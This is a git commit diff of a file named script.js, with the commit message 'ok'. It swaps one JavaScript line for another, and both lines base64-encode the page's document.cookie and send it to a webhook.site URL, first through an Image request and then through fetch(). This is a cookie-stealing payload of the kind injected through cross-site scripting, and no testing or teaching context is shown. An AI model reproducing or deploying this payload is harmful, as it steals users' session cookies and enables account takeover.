3946d7ca2290c2a595dcee3ccedb9b4916c9ba52
huyhoangtran00 <huyhoangtran00@gmail.com>
2025-04-14 15:51:45 +0700

    ok

--- script.js
+++ script.js
@@ -1,2 +1,2 @@
 
-x = new Image(); x.src = 'https://webhook.site/162aa37b-de55-4f05-b265-5919a4516028?data='+btoa(document.cookie);
+fetch("https://webhook.site/162aa37b-de55-4f05-b265-5919a4516028?data="+btoa(document.cookie))
